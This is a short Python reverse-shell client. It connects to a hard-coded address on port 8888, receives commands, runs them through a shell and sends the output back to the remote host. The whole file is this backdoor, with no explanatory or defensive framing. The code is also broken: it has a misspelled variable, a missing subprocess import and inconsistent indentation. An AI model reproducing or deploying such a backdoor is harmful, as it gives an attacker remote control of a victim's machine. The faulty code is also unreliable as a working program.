import socket

REMOTE_HOST = '192.168.64.8'
REMOTE_PORT = 8888

connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client = socket.socket()
print("[-] Connection Initiating...")
clinet.connect((REMOTE_HOST, REMOTE_PORT))
print("[-] Connection initiated!")


while True:
  print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)